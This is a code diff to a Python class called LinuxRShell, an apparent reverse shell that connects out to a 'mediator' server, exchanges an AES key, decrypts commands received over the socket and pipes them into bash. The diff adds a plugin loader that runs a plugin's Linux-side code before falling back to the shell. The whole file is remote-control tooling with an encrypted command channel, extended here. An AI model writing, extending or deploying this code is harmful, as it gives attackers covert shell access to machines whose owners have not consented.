@@ -18,10 +18,32 @@ class LinuxRShell:
     def __init__(self, mediatorHost="", connectionKey="#!ConnectionKey_CHANGE_ME!!!"):
         self.connectionKey = connectionKey
         self.handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.plugins = self.loadPlugins()
         if not mediatorHost:
             raise(ValueError("Hostname of mediator server not specified."))
         self.connect(mediatorHost)
         self.cipherKey = self.keyExchange()
+
+    def loadPlugins(self):
+        commandClasses = inspect.getmembers(plugins, inspect.isclass)
+        commandClasses.pop(0)
+        externalCommands = dict()
+        for className, commandObject in commandClasses:
+            externalCommands[str(commandObject)] = commandObject.linuxTarget
+        return externalCommands
+
+    def tryPlugin(self, commandLine):
+        argv = commandLine.split()
+        if not argv:
+            # newline sent -- not a plugin
+            return False
+        command = argv[0]
+        try:
+            self.plugins[command](argv)
+            return True
+        except KeyError:
+            # command not in plugins
+            return False
 
     def readCommands(self, bash):
         while True:
@@ -31,8 +53,12 @@ class LinuxRShell:
             cipher = AES.new(self.cipherKey, AES.MODE_EAX, nonce=nonce)
             command = cipher.decrypt(ciphertext)
             if len(command) > 0:
-                bash.stdin.write(command)
-                bash.stdin.flush()
+                # check if command is a plugin -- if so run plugin's linux target code
+                plugin = self.tryPlugin(command)
+                if not plugin:
+                    # not a plugin -- send command to shell
+                    bash.stdin.write(command)
+                    bash.stdin.flush()
 
     def sendResponses(self, bash):
         while True:
